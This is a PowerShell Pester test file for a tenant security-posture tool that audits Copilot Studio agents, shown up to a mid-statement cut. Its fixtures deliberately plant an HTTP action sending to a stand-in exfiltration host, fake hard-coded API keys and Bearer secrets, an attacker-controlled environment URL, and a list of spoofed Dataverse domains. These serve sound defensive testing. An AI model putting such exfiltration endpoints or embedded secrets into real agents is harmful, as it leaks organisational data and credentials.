#Requires -Version 7.0
#
# TP.CopilotStudio.Tests.ps1
# TenantPosture — NRG Technology Services / NextLayerSec LLC
# Author: Matthew Levorson
#
# Drives the real Copilot Studio collector (Invoke-TPCollectCopilotStudio)
# against stand-ins for Graph context, the Power Platform admin API and the
# Dataverse Web API, injected INTO module scope (a test-scope Mock is not seen
# from inside the module), then runs the PPL-4.x evaluators on what it stored.
#
# Pins: each control's Satisfied, Gap and not-assessed paths; an environment
# that refuses the read (403) and a truncated read are never "no agents"; the
# Dataverse request helper accepts only GET to a Dataverse host and refuses a
# next-page link to another host; no secret, topic text or instruction text
# reaches raw data or findings; an older results file without the key is not
# assessed; the empty dormancy standard lands in the StandardNotApproved
# scope bucket; and -ControlId 'PPL-4.*' needs Graph and Power Platform only.
#
# Fixture shapes follow the Dataverse Web API (bots / botcomponents /
# systemusers rows with OData lookup columns _x_value) and the Power Platform
# admin API environment list (properties.linkedEnvironmentMetadata).

Describe 'Copilot Studio agents (PPL-4.x)' {

    BeforeAll {
        $script:RepoRoot = if ($PSScriptRoot) { Split-Path -Parent $PSScriptRoot } else { (Get-Location).Path }
        Import-Module (Join-Path $script:RepoRoot 'TenantPosture.psm1') -Force -ErrorAction Stop
        $script:Mod = Get-Module 'TenantPosture'

        $script:EnvA   = 'Default-11111111-1111-4111-8111-111111111111'
        $script:EnvB   = 'e2222222-2222-4222-8222-222222222222'
        $script:EnvC   = 'e3333333-3333-4333-8333-333333333333'
        $script:HostA  = 'contoso.crm.dynamics.com'
        $script:HostC  = 'contosodev.crm4.dynamics.com'
        $script:OwnerDv  = 'aaaaaaaa-0000-4000-8000-000000000001'
        $script:OwnerAad = 'bbbbbbbb-0000-4000-8000-000000000001'
        $script:Secret   = 'Zq9SUPERSECRETvalue0123456789abcd'

        & $script:Mod {
            Set-Item -Path 'function:script:Get-MgContext' -Value {
                [pscustomobject]@{ TenantId = 'abcdef01-2345-4678-9abc-def012345678'; Account = 'op@contoso.com'; AuthType = $script:CS.AuthType }
            }
            Set-Item -Path 'function:script:Get-TPPowerPlatformToken' -Value {
                param([string] $TenantId, [string] $LoginHint, [int] $TimeoutSeconds = 180, [string] $Audience = 'https://service.powerapps.com/')
                $script:CS.Audiences += $Audience
                foreach ($h in @($script:CS.TokenFail)) { if ($Audience -like "*$h*") { throw 'AADSTS50076: interaction required' } }
                'fake-token'
            }
            Set-Item -Path 'function:script:Invoke-TPPowerPlatformApi' -Value {
                param([string] $Uri, [string] $Token, [string] $Method = 'GET', [switch] $Paged)
                $script:CS.BapCalls += $Uri
                return @($script:CS.BapEnvs)
            }
            Set-Item -Path 'function:script:Invoke-TPDataverseApi' -Value {
                param([string] $Uri, [string] $Token, [string] $Method = 'GET', [switch] $Paged, [int] $MaxPages = 50, [int] $PageSize = 100)
                $u = [uri]$Uri
                $script:CS.DvCalls += $Uri
                if ($u.Host -in @($script:CS.Forbidden)) { throw 'Response status code does not indicate success: 403 (Forbidden).' }
                $table = ($u.AbsolutePath -split '/')[-1]
                $rows = @($script:CS.Tables["$($u.Host)|$table"])
                $trunc = "$($u.Host)|$table" -in @($script:CS.Truncate)
                return [pscustomobject]@{ Rows = @($rows | Where-Object { $_ }); Truncated = $trunc; Pages = 1 }
            }
        }

        function script:J([string] $s) { $s | ConvertFrom-Json }

        function script:New-Bot {
            param([string] $Id, [string] $Name, [hashtable] $Over = @{})
            $b = [ordered]@{
                botid = $Id; name = $Name; schemaname = "cr1_$Id"
                accesscontrolpolicy = 1; authenticationmode = 2; authenticationtrigger = 0
                statecode = 0; publishedon = '2026-09-01T10:00:00Z'; modifiedon = '2026-10-01T10:00:00Z'; createdon = '2025-01-01T10:00:00Z'
                ismanaged = $false
                configuration = '{"settings":{"GenerativeActionsEnabled":true},"Instructions":"SECRET-INSTRUCTION-TEXT do not reveal"}'
                _owninguser_value = $script:OwnerDv; _owningteam_value = $null
            }
            foreach ($k in $Over.Keys) { $b[$k] = $Over[$k] }
            return ([pscustomobject]$b)
        }
        function script:New-Comp {
            param([string] $Bot, [string] $Id, [int] $Type, [string] $Data, [string] $Name = 'Topic', [int] $State = 0)
            [pscustomobject]@{ botcomponentid = $Id; name = $Name; componenttype = $Type; statecode = $State; data = $Data; content = $null; _parentbotid_value = $Bot }
        }

        $script:YamlTopicHttps = @'
kind: AdaptiveDialog
beginDialog:
  kind: OnRecognizedIntent
  id: main
  actions:
    - kind: HttpRequestAction
      id: callApi
      url: ="https://api.partner-safe.example.org/v1/orders?q=" & Topic.q
      method: Get
    - kind: SendActivity
      id: say
      activity: TOPIC-YAML-MARKER Here are your orders.
'@
        $script:YamlToolInvoker = @'
kind: TaskDialog
inputs:
  - kind: ManualTaskInput
    propertyName: siteUrl
    value: https://contoso.sharepoint.com/sites/hr
modelDisplayName: Get items
action:
  kind: InvokeConnectorTaskAction
  connectionReference: cr1_agent.shared_sharepointonline.abc
  connectionProperties:
    mode: Invoker
  operationId: GetItems
'@
        $script:YamlGpt = @'
kind: GptComponentMetadata
displayName: HR Helper
instructions: |
  SECRET-INSTRUCTION-TEXT Answer only HR policy questions.
'@

        # A clean tenant: env A (Dataverse) with two good agents, env B without Dataverse.
        function script:New-Scenario {
            $s = @{
                AuthType = 'Delegated'; Audiences = @(); BapCalls = @(); DvCalls = @()
                TokenFail = @(); Forbidden = @(); Truncate = @()
                BapEnvs = @(
                    (J "{`"name`":`"$script:EnvA`",`"properties`":{`"displayName`":`"Contoso (default)`",`"linkedEnvironmentMetadata`":{`"instanceUrl`":`"https://$script:HostA/`",`"instanceApiUrl`":`"https://contoso.api.crm.dynamics.com`"}}}")
                    (J "{`"name`":`"$script:EnvB`",`"properties`":{`"displayName`":`"Teams only`"}}")
                )
                Tables = @{}
            }
            $s.Tables["$script:HostA|bots"] = @(
                (New-Bot 'b1' 'HR Helper'),
                (New-Bot 'b2' 'IT Desk')
            )
            $s.Tables["$script:HostA|botcomponents"] = @(
                (New-Comp 'b1' 'c1' 9 $script:YamlTopicHttps 'Orders'),
                (New-Comp 'b1' 'c2' 9 $script:YamlToolInvoker 'Get items'),
                (New-Comp 'b1' 'c3' 15 $script:YamlGpt 'Agent'),
                (New-Comp 'b2' 'c4' 15 $script:YamlGpt 'Agent')
            )
            $s.Tables["$script:HostA|systemusers"] = @(
                (J "{`"systemuserid`":`"$script:OwnerDv`",`"azureactivedirectoryobjectid`":`"$script:OwnerAad`",`"isdisabled`":false,`"applicationid`":null}")
            )
            return $s
        }

        function script:Set-Users {
            param([bool] $Enabled = $true, [string] $Status = 'Collected', [switch] $Absent)
            $users = if ($Absent) { @() } else { @(@{ Id = $script:OwnerAad; AccountEnabled = $Enabled; UserPrincipalName = 'maker@contoso.com' }) }
            Set-TPRawData -Key 'AAD-Users' -Data @{ Success = $true; Data = @{ Users = $users; SectionStatus = @{ Users = $Status; MFARegistration = 'Collected' } } }
        }

        # Runs the real collector on a scenario, then every PPL-4 evaluator.
        function script:Invoke-Run {
            param([hashtable] $Scenario, [scriptblock] $Before = {}, [switch] $NoUsers)
            Clear-TPState
            & $script:Mod { param($s) $script:CS = $s } $Scenario
            if (-not $NoUsers) { Set-Users }
            & $Before
            $null = Invoke-TPCollectCopilotStudio
            foreach ($fn in 'Test-TPControlCopilotStudioSharing', 'Test-TPControlCopilotStudioAuthentication', 'Test-TPControlCopilotStudioHttpNodes',
                            'Test-TPControlCopilotStudioEmailTools', 'Test-TPControlCopilotStudioMakerAuth', 'Test-TPControlCopilotStudioCredentials',
                            'Test-TPControlCopilotStudioMcpTools', 'Test-TPControlCopilotStudioInstructions', 'Test-TPControlCopilotStudioOwnership',
                            'Test-TPControlCopilotStudioDormant') { & $fn }
        }
        function script:F([string] $Cid) { @(Get-TPFindings | Where-Object { $_.ControlId -eq $Cid }) }
        function script:State([string] $Cid) { $f = @(F $Cid); $f.Count | Should -Be 1 -Because "$Cid emits one finding"; $f[0].State }
    }

    Context 'A clean tenant' {
        BeforeAll { Invoke-Run (New-Scenario) }

        It 'stores the environment list, the Dataverse environment and both agents' {
            $raw = Get-TPRawData -Key 'CopilotStudio'
            $raw.Success | Should -BeTrue
            $raw.Data.SectionStatus.Environments | Should -Be 'Collected'
            $raw.Data.SectionStatus[$script:EnvA] | Should -Be 'Collected'
            @($raw.Data.Agents).Count | Should -Be 2
            @($raw.Data.Environments | Where-Object { $_.HasDataverse }).Count | Should -Be 1
            $raw.Data.EnvironmentListSource | Should -Be 'bap-api'
        }
        It 'requests a token only for the validated Dataverse base URL' {
            $aud = & $script:Mod { $script:CS.Audiences }
            $aud | Should -Contain "https://$script:HostA"
        }
        It '<_> is Satisfied, except the advisory and standard-gated controls' -ForEach @('PPL-4.1', 'PPL-4.2', 'PPL-4.3', 'PPL-4.4', 'PPL-4.5', 'PPL-4.6', 'PPL-4.7', 'PPL-4.8', 'PPL-4.9') {
            State $_ | Should -Be 'Satisfied'
        }
        It 'PPL-4.10 is not assessed because no dormancy threshold is approved, and lists last-modified dates' {
            $f = (F 'PPL-4.10')[0]
            $f.State | Should -Be 'NotApplicable'
            $f.Detail | Should -Match 'because no dormancy threshold is approved'
            $f.Detail | Should -Match 'HR Helper .*last modified 2026-10-01'
        }
        It 'every NotApplicable keeps its framework citations' {
            foreach ($f in @(Get-TPFindings | Where-Object { $_.ControlId -like 'PPL-4.*' -and $_.State -eq 'NotApplicable' })) {
                @($f.FrameworkIds | Where-Object { "$_" -like 'NIST:*' }).Count | Should -BeGreaterThan 0 -Because $f.ControlId
            }
        }
    }

    Context 'Reusing the Power Platform environment list' {
        It 'reuses the list when the Power Platform collector stored each Dataverse URL' {
            $s = New-Scenario
            Invoke-Run $s -Before {
                Set-TPRawData -Key 'PowerPlatform' -Data @{ Success = $true; Data = @{ SectionStatus = @{ Environments = 'Collected' }; Environments = @(
                    @{ Id = $script:EnvA; DisplayName = 'Contoso (default)'; InstanceUrl = "https://$script:HostA/" }) } }
            }
            (Get-TPRawData -Key 'CopilotStudio').Data.EnvironmentListSource | Should -Be 'PowerPlatform'
            @(& $script:Mod { $script:CS.BapCalls }).Count | Should -Be 0
        }
        It 'reads the list itself from an older Power Platform result without the Dataverse URL' {
            $s = New-Scenario
            Invoke-Run $s -Before {
                Set-TPRawData -Key 'PowerPlatform' -Data @{ Success = $true; Data = @{ SectionStatus = @{ Environments = 'Collected' }; Environments = @(@{ Id = $script:EnvA; DisplayName = 'x' }) } }
            }
            (Get-TPRawData -Key 'CopilotStudio').Data.EnvironmentListSource | Should -Be 'bap-api'
        }
    }

    Context 'Each control finds its offender (Gap)' {
        It 'PPL-4.1: access control Any' {
            $s = New-Scenario; $s.Tables["$script:HostA|bots"][0].accesscontrolpolicy = 0
            Invoke-Run $s
            State 'PPL-4.1' | Should -Be 'Gap'
            (F 'PPL-4.1')[0].Detail | Should -Match "HR Helper \(Contoso \(default\)\): access control 'Any'"
            @((F 'PPL-4.1')[0].AffectedObjects).Count | Should -Be 1
        }
        It 'PPL-4.1: access control Any (multi-tenant)' {
            $s = New-Scenario; $s.Tables["$script:HostA|bots"][1].accesscontrolpolicy = 3
            Invoke-Run $s
            State 'PPL-4.1' | Should -Be 'Gap'
        }
        It 'PPL-4.2: no authentication' {
            $s = New-Scenario; $s.Tables["$script:HostA|bots"][0].authenticationmode = 1
            Invoke-Run $s
            State 'PPL-4.2' | Should -Be 'Gap'
        }
        It 'PPL-4.2: manual authentication without Require users to sign in; Integrated with As Needed is not a failure' {
            $s = New-Scenario; $s.Tables["$script:HostA|bots"][0].authenticationmode = 3; $s.Tables["$script:HostA|bots"][0].authenticationtrigger = 0
            Invoke-Run $s
            State 'PPL-4.2' | Should -Be 'Gap'
            (F 'PPL-4.2')[0].Detail | Should -Match 'HR Helper'
            (F 'PPL-4.2')[0].Detail | Should -Not -Match 'IT Desk'
        }
        It 'PPL-4.3: plain HTTP and a non-443 port, recorded as scheme and port only' {
            $s = New-Scenario
            $s.Tables["$script:HostA|botcomponents"] += New-Comp 'b2' 'c9' 9 @'
kind: AdaptiveDialog
beginDialog:
  actions:
    - kind: HttpRequestAction
      id: leak
      url: http://exfil-host.example.net/collect
    - kind: HttpRequestAction
      id: odd
      url: https://api.partner-safe.example.org:8443/x
'@
            Invoke-Run $s
            State 'PPL-4.3' | Should -Be 'Gap'
            $d = (F 'PPL-4.3')[0].Detail
            $d | Should -Match 'IT Desk'
            $d | Should -Match 'http in component c9'
            $d | Should -Match 'port 8443'
            ((Get-TPRawData -Key 'CopilotStudio') | ConvertTo-Json -Depth 20) | Should -Not -Match 'exfil-host'
        }
        It 'PPL-4.3: a URL built only from variables is not assessed, never passed' {
            $s = New-Scenario
            $s.Tables["$script:HostA|botcomponents"] += New-Comp 'b2' 'c9' 9 "kind: AdaptiveDialog`nbeginDialog:`n  actions:`n    - kind: HttpRequestAction`n      id: dyn`n      url: =Topic.Endpoint`n"
            Invoke-Run $s
            State 'PPL-4.3' | Should -Be 'NotApplicable'
            (F 'PPL-4.3')[0].Detail | Should -Match 'built at run time'
        }
        It 'PPL-4.4: an Outlook send tool with an AI-filled recipient' {
            $s = New-Scenario
            $s.Tables["$script:HostA|botcomponents"] += New-Comp 'b1' 'c8' 9 @'
kind: TaskDialog
inputs:
  - kind: AutomaticTaskInput
    propertyName: emailMessage/To
  - kind: ManualTaskInput
    propertyName: emailMessage/Subject
    value: Report
  - kind: ManualTaskInput
    propertyName: emailMessage/Body
    value: See attached.
modelDisplayName: Send an email (V2)
action:
  kind: InvokeConnectorTaskAction
  connectionReference: cr1_agent.shared_office365.def
  connectionProperties:
    mode: Invoker
  operationId: SendEmailV2
'@ 'Send an email (V2)'
            Invoke-Run $s
            State 'PPL-4.4' | Should -Be 'Gap'
            (F 'PPL-4.4')[0].Detail | Should -Match 'Send an email \(V2\) \(To not fixed\)'
            State 'PPL-4.5' | Should -Be 'Satisfied'
        }
        It 'PPL-4.4: an email tool whose recipient, subject and body are fixed values passes' {
            $s = New-Scenario
            $s.Tables["$script:HostA|botcomponents"] += New-Comp 'b1' 'c8' 9 "kind: TaskDialog`ninputs:`n  - kind: ManualTaskInput`n    propertyName: emailMessage/To`n    value: hr@contoso.com`n  - kind: ManualTaskInput`n    propertyName: emailMessage/Subject`n    value: Request`n  - kind: ManualTaskInput`n    propertyName: emailMessage/Body`n    value: A request was filed.`naction:`n  kind: InvokeConnectorTaskAction`n  connectionReference: cr1.shared_office365.x`n  connectionProperties:`n    mode: Invoker`n  operationId: SendEmailV2`n" 'Notify HR'
            Invoke-Run $s
            State 'PPL-4.4' | Should -Be 'Satisfied'
        }
        It 'PPL-4.5: a connector tool without the end-user connection mode' {
            $s = New-Scenario
            $s.Tables["$script:HostA|botcomponents"] += New-Comp 'b2' 'c7' 9 "kind: TaskDialog`nmodelDisplayName: Query SQL`naction:`n  kind: InvokeConnectorTaskAction`n  connectionReference: cr1_agent.shared_sql.xyz`n  operationId: ExecuteQuery`n" 'Query SQL'
            Invoke-Run $s
            State 'PPL-4.5' | Should -Be 'Gap'
            (F 'PPL-4.5')[0].Detail | Should -Match 'Query SQL \(shared_sql\)'
        }
        It 'PPL-4.6: a hard-coded API key, named by pattern type and component only' {
            $s = New-Scenario
            $s.Tables["$script:HostA|botcomponents"] += New-Comp 'b1' 'c6' 9 "kind: AdaptiveDialog`nbeginDialog:`n  actions:`n    - kind: HttpRequestAction`n      id: k`n      url: https://api.partner-safe.example.org/`n      headers:`n        x-api-key: $script:Secret`n"
            Invoke-Run $s
            State 'PPL-4.6' | Should -Be 'Gap'
            (F 'PPL-4.6')[0].Detail | Should -Match 'API key assignment in component c6'
        }
        It 'PPL-4.6: a Power Fx reference is not a hard-coded credential' {
            $s = New-Scenario
            $s.Tables["$script:HostA|botcomponents"] += New-Comp 'b1' 'c6' 9 "kind: AdaptiveDialog`nbeginDialog:`n  actions:`n    - kind: HttpRequestAction`n      id: k`n      url: https://api.partner-safe.example.org/`n      headers:`n        x-api-key: =Env.cr1_ApiKeyFromKeyVault`n"
            Invoke-Run $s
            State 'PPL-4.6' | Should -Be 'Satisfied'
        }
        It 'PPL-4.7: an MCP tool is listed for manual review with its host, never passed' {
            $s = New-Scenario
            $s.Tables["$script:HostA|botcomponents"] += New-Comp 'b2' 'c5' 9 "kind: TaskDialog`nmodelDisplayName: Docs MCP`naction:`n  kind: InvokeExternalAgentTaskAction`n  connectionReference: cr1.shared_docsmcp.x`n  connectionProperties:`n    mode: Invoker`n  operationDetails:`n    kind: ModelContextProtocolMetadata`n    serverUrl: https://mcp.vendor-tools.example.com/sse`n" 'Docs MCP'
            Invoke-Run $s
            $f = (F 'PPL-4.7')[0]
            $f.State | Should -Be 'NotApplicable'
            $f.Detail | Should -Match 'requires manual verification'
            $f.Detail | Should -Match 'mcp\.vendor-tools\.example\.com'
        }
        It 'PPL-4.8: generative orchestration with no custom instructions' {
            $s = New-Scenario
            $s.Tables["$script:HostA|bots"][1].configuration = '{"settings":{"GenerativeActionsEnabled":true}}'
            $s.Tables["$script:HostA|botcomponents"] = @($s.Tables["$script:HostA|botcomponents"] | Where-Object { $_.botcomponentid -ne 'c4' })
            Invoke-Run $s
            State 'PPL-4.8' | Should -Be 'Gap'
            (F 'PPL-4.8')[0].Detail | Should -Match 'IT Desk'
        }
        It 'PPL-4.8: classic orchestration needs no instructions' {
            $s = New-Scenario
            $s.Tables["$script:HostA|bots"][1].configuration = '{"settings":{"GenerativeActionsEnabled":false}}'
            $s.Tables["$script:HostA|botcomponents"] = @($s.Tables["$script:HostA|botcomponents"] | Where-Object { $_.botcomponentid -ne 'c4' })
            Invoke-Run $s
            State 'PPL-4.8' | Should -Be 'Satisfied'
        }
        It 'PPL-4.9: a disabled owner, and an owner missing from a member list read in full' {
            Invoke-Run (New-Scenario) -NoUsers -Before { Set-Users -Enabled $false }
            State 'PPL-4.9' | Should -Be 'Gap'
            (F 'PPL-4.9')[0].Detail | Should -Match 'owner account disabled'
            Invoke-Run (New-Scenario) -NoUsers -Before { Set-Users -Absent }
            State 'PPL-4.9' | Should -Be 'Gap'
            (F 'PPL-4.9')[0].Detail | Should -Match 'owner not found'
        }
        It 'PPL-4.9: a member list cut short by its page cap leaves ownership not assessed' {
            Invoke-Run (New-Scenario) -NoUsers -Before { Set-Users -Status 'Truncated' -Absent }
            State 'PPL-4.9' | Should -Be 'NotApplicable'
            (F 'PPL-4.9')[0].Detail | Should -Match 'AAD-Users'
        }
        It 'PPL-4.9: a team-owned agent is not assessed, never passed' {
            $s = New-Scenario; $s.Tables["$script:HostA|bots"][1]._owninguser_value = $null; $s.Tables["$script:HostA|bots"][1]._owningteam_value = 'cccccccc-0000-4000-8000-000000000001'
            Invoke-Run $s
            State 'PPL-4.9' | Should -Be 'NotApplicable'
        }
        It 'PPL-4.10: with an approved threshold, a published agent unmodified beyond it is a Gap' {
            $s = New-Scenario; $s.Tables["$script:HostA|bots"][0].modifiedon = '2024-01-01T00:00:00Z'
            Invoke-Run $s -Before {
                & $script:Mod { $script:CS_RealStandards = ${function:Get-TPStandards}; Set-Item -Path 'function:script:Get-TPStandards' -Value { param([string] $Path) $s = & $script:CS_RealStandards; $s.CopilotStudioDormantDays = @('180'); $s } }
            }
            try {
                State 'PPL-4.10' | Should -Be 'Gap'
                (F 'PPL-4.10')[0].Detail | Should -Match 'HR Helper .*not modified since 2024-01-01'
                (F 'PPL-4.10')[0].Detail | Should -Not -Match 'IT Desk'
            } finally {
                & $script:Mod { Set-Item -Path 'function:script:Get-TPStandards' -Value $script:CS_RealStandards }
            }
        }
        It 'managed-solution agents are set aside and counted' {
            $s = New-Scenario; $s.Tables["$script:HostA|bots"][1].ismanaged = $true; $s.Tables["$script:HostA|bots"][1].accesscontrolpolicy = 0
            Invoke-Run $s
            State 'PPL-4.1' | Should -Be 'Satisfied'
            (F 'PPL-4.1')[0].Detail | Should -Match '1 agent\(s\) from managed solutions were set aside'
        }
    }

    Context 'Reads that did not complete are never "no agents"' {
        It 'an environment that refuses the read (403) leaves every control not assessed, naming the role' {
            $s = New-Scenario; $s.Forbidden = @($script:HostA)
            Invoke-Run $s
            $raw = Get-TPRawData -Key 'CopilotStudio'
            $raw.Data.SectionStatus[$script:EnvA] | Should -Be 'Failed'
            $raw.Data.SectionErrors[$script:EnvA] | Should -Match 'HTTP 403'
            $raw.Data.SectionErrors[$script:EnvA] | Should -Match 'Dataverse security role'
            foreach ($cid in 'PPL-4.1', 'PPL-4.2', 'PPL-4.3', 'PPL-4.6', 'PPL-4.7', 'PPL-4.9') {
                State $cid | Should -Be 'NotApplicable' -Because "$cid cannot pass on an unread environment"
                (F $cid)[0].Detail | Should -Match 'not collected' -Because $cid
            }
            (F 'PPL-4.1')[0].Detail | Should -Match 'Dataverse security role'
        }
        It 'an offender in a read environment is still a Gap, and the Detail names the unread one' {
            $s = New-Scenario
            $s.BapEnvs += (J "{`"name`":`"$script:EnvC`",`"properties`":{`"displayName`":`"Dev`",`"linkedEnvironmentMetadata`":{`"instanceUrl`":`"https://$script:HostC`"}}}")
            $s.Forbidden = @($script:HostC)
            $s.Tables["$script:HostA|bots"][0].accesscontrolpolicy = 0
            Invoke-Run $s
            State 'PPL-4.1' | Should -Be 'Gap'
            (F 'PPL-4.1')[0].Detail | Should -Match 'Dev \(Agents Failed'
            State 'PPL-4.2' | Should -Be 'NotApplicable'
        }
        It 'a truncated agent read is Truncated and not assessed' {
            $s = New-Scenario; $s.Truncate = @("$script:HostA|bots")
            Invoke-Run $s
            (Get-TPRawData -Key 'CopilotStudio').Data.SectionStatus[$script:EnvA] | Should -Be 'Truncated'
            State 'PPL-4.1' | Should -Be 'NotApplicable'
            (F 'PPL-4.1')[0].Detail | Should -Match 'Agents Truncated'
        }
        It 'a truncated component read leaves the component controls not assessed but not the agent ones' {
            $s = New-Scenario; $s.Truncate = @("$script:HostA|botcomponents")
            Invoke-Run $s
            State 'PPL-4.3' | Should -Be 'NotApplicable'
            State 'PPL-4.1' | Should -Be 'Satisfied'
        }
        It 'an environment URL that is not a Dataverse host is never contacted' {
            $s = New-Scenario
            $s.BapEnvs = @((J "{`"name`":`"$script:EnvA`",`"properties`":{`"displayName`":`"Odd`",`"linkedEnvironmentMetadata`":{`"instanceUrl`":`"https://attacker.example.net/`"}}}"))
            Invoke-Run $s
            @(& $script:Mod { $script:CS.DvCalls } | Where-Object { $_ -match 'attacker' }).Count | Should -Be 0
            @(& $script:Mod { $script:CS.Audiences } | Where-Object { $_ -match 'attacker' }).Count | Should -Be 0
            State 'PPL-4.1' | Should -Be 'NotApplicable'
        }
        It 'an app-only run collects nothing and says why' {
            $s = New-Scenario; $s.AuthType = 'AppOnly'
            Invoke-Run $s
            (Get-TPRawData -Key 'CopilotStudio').Success | Should -BeFalse
            (F 'PPL-4.1')[0].State | Should -Be 'NotApplicable'
            (F 'PPL-4.1')[0].Detail | Should -Match 'was not collected; not assessed\. Reason recorded by the collector: .*app-only'
        }
        It 'no Copilot Studio data at all (an older results file without the key) is not assessed, with citations' {
            Clear-TPState
            foreach ($fn in 'Test-TPControlCopilotStudioSharing', 'Test-TPControlCopilotStudioDormant', 'Test-TPControlCopilotStudioMcpTools') { & $fn }
            foreach ($cid in 'PPL-4.1', 'PPL-4.10', 'PPL-4.7') {
                $f = (F $cid)[0]
                $f.State | Should -Be 'NotApplicable'
                $f.Detail | Should -Match 'was not collected; not assessed'
                @($f.FrameworkIds).Count | Should -BeGreaterThan 0
            }
        }
    }

    Context 'Privacy: no secret, topic text or instruction text is stored' {
        It 'raw data and findings carry none of the planted values' {
            $s = New-Scenario
            $s.Tables["$script:HostA|botcomponents"] += New-Comp 'b1' 'c6' 9 "kind: AdaptiveDialog`nbeginDialog:`n  actions:`n    - kind: SendActivity`n      id: s`n      activity: TOPIC-YAML-MARKER password: $script:Secret`n    - kind: HttpRequestAction`n      id: k`n      url: http://exfil-host.example.net/`n      headers:`n        Authorization: Bearer $script:Secret`n"
            Invoke-Run $s
            $blob = (Get-TPRawData -Key 'CopilotStudio' | ConvertTo-Json -Depth 30) + (@(Get-TPFindings) | ConvertTo-Json -Depth 30)
            foreach ($bad in $script:Secret, 'TOPIC-YAML-MARKER', 'SECRET-INSTRUCTION-TEXT', 'exfil-host', 'partner-safe', 'kind: AdaptiveDialog', 'GenerativeActionsEnabled', 'fake-token') {
                $blob | Should -Not -Match ([regex]::Escape($bad)) -Because "'$bad' must never be stored"
            }
            (F 'PPL-4.6')[0].State | Should -Be 'Gap'
            (F 'PPL-4.6')[0].Detail | Should -Match 'Bearer token'
            (F 'PPL-4.6')[0].Detail | Should -Match 'Password or secret value'
        }
    }

    Context 'The dormancy standard ships empty and is reported as a standard, not a collection fault' {
        It 'files PPL-4.10 in the StandardNotApproved scope bucket' {
            Invoke-Run (New-Scenario)
            $scope = Get-TPAssessmentScope -Findings @(Get-TPFindings) -RawData (Get-TPRawData)
            @($scope.StandardNotApproved | ForEach-Object { $_.ControlId }) | Should -Contain 'PPL-4.10'
            @($scope.CollectionIncomplete | ForEach-Object { $_.ControlId }) | Should -Not -Contain 'PPL-4.10'
        }
        It 'Config/tp-standards.json holds no dormancy value until the owner approves one' {
            @((Get-TPStandards -Path (Join-Path $script:RepoRoot 'Config/tp-standards.json')).CopilotStudioDormantDays).Count | Should -Be 0
        }
    }

    Context 'Control selection: PPL-4.* needs Graph and Power Platform only' {
        It 'runs the Copilot Studio and Power Platform collectors and signs in to nothing else' {
            $r = & $script:Mod { Resolve-TPControlSelection -Include @('PPL-4.*') -Exclude @() }
            $r.Valid | Should -BeTrue
            @($r.SelectedControlIds).Count | Should -Be 10
            $r.Collectors | Should -Contain 'Invoke-TPCollectCopilotStudio'
            $r.Collectors | Should -Contain 'Invoke-TPCollectPowerPlatform'
            $r.Collectors | Should -Contain 'Invoke-TPCollectAADUsers'
            $r.Services.Graph | Should -BeTrue
            $r.Services.PowerPlatform | Should -BeTrue
            foreach ($svc in 'Exchange', 'Purview', 'Teams', 'SharePointShell', 'DNS') { $r.Services[$svc] | Should -BeFalse -Because "$svc is not read by PPL-4.*" }
            $r.Fallback | Should -BeFalse
        }
        It 'is registered in the collector catalog and skipped by -SkipPowerPlatform' {
            $cat = @(& $script:Mod { Get-TPCollectorCatalog } | Where-Object { $_.Function -eq 'Invoke-TPCollectCopilotStudio' })
            $cat.Count | Should -Be 1
            $cat[0].Keys | Should -Be @('CopilotStudio')
            (@(Get-TPWorkloadSkipMap | Where-Object { $_.Flag -eq 'SkipPowerPlatform' })[0].Keys) | Should -Contain 'CopilotStudio'
        }
    }
}

Describe 'Dataverse request helper and token audience rules' {

    BeforeAll {
        $script:RepoRoot = if ($PSScriptRoot) { Split-Path -Parent $PSScriptRoot } else { (Get-Location).Path }
        Import-Module (Join-Path $script:RepoRoot 'TenantPosture.psm1') -Force -ErrorAction Stop
        $script:Mod = Get-Module 'TenantPosture'
        # Stand in for the network: the real helper's Invoke-RestMethod call
        # resolves to this module-scope function.
        & $script:Mod {
            Set-Item -Path 'function:script:Invoke-RestMethod' -Value {
                param([string] $Method, [string] $Uri, $Headers, [int] $MaximumRedirection, [int] $TimeoutSec, $ErrorAction)
                $script:DV_Calls += "$Method $Uri"
                $script:DV_Redirects += $MaximumRedirection
                $page = $script:DV_Pages[$Uri]
                if ($null -eq $page) { throw "unexpected URL $Uri" }
                return $page
            }
        }
        function script:Set-Pages([hashtable] $Pages) { & $script:Mod { param($p) $script:DV_Pages = $p; $script:DV_Calls = @(); $script:DV_Redirects = @() } $Pages }
        function script:Invoke-Dv { param([hashtable] $A) & $script:Mod { param($a) Invoke-TPDataverseApi @a } $A }
    }

    It 'accepts the commercial, regional, GCC, GCC High, DoD and China Dataverse hosts and nothing else' {
        & $script:Mod {
            foreach ($h in 'contoso.crm.dynamics.com', 'contoso.api.crm.dynamics.com', 'contoso.crm4.dynamics.com', 'contoso.crm11.dynamics.com',
                           'contoso.crm9.dynamics.com', 'contoso.crm.microsoftdynamics.us', 'contoso.api.crm.appsplatform.us', 'contoso.crm.dynamics.cn') {
                Test-TPDataverseHost -HostName $h | Should -BeTrue -Because $h
            }
            foreach ($h in 'crm.dynamics.com', 'contoso.crm.dynamics.com.evil.net', 'contoso.evil.net', 'contoso.crm.dynamics.org', 'a.b.crm.dynamics.com',
                           '-contoso.crm.dynamics.com', 'contoso.crm123.dynamics.com', "contoso.crm.dynamics.com`n", '') {
                Test-TPDataverseHost -HostName $h | Should -BeFalse -Because "'$h'"
            }
        }
    }
    It 'refuses a request that is not GET' {
        { Invoke-Dv @{ Uri = 'https://contoso.crm.dynamics.com/api/data/v9.2/bots'; Token = 't'; Method = 'POST' } } | Should -Throw
        { Invoke-Dv @{ Uri = 'https://contoso.crm.dynamics.com/api/data/v9.2/bots'; Token = 't'; Method = 'DELETE' } } | Should -Throw
    }
    It 'refuses another host, plain http, another port, user information and another path' {
        foreach ($u in 'https://graph.microsoft.com/api/data/v9.2/bots', 'http://contoso.crm.dynamics.com/api/data/v9.2/bots',
                       'https://contoso.crm.dynamics.com:8443/api/data/v9.2/bots', 'https://user:pw@contoso.crm.dynamics.com/api/data/v9.2/bots',
                       'https://contoso.crm.dynamics.com/XRMServices/2011/Organization.svc') {
            Set-Pages @{}
            { Invoke-Dv @{ Uri = $u; Token = 't' } } | Should -Throw -ExpectedMessage 'refused*' -Because $u
            @(& $script:Mod { $script:DV_Calls }).Count | Should -Be 0 -Because "nothing is sent for $u"
        }
    }
    It 'follows a next-page link on the same host, without redirects, and reports a page cap as truncated' {
        $p1 = 'https://contoso.crm.dynamics.com/api/data/v9.2/bots?$select=botid'
        $p2 = 'https://contoso.crm.dynamics.com/api/data/v9.2/bots?$select=botid&$skiptoken=2'
        Set-Pages @{
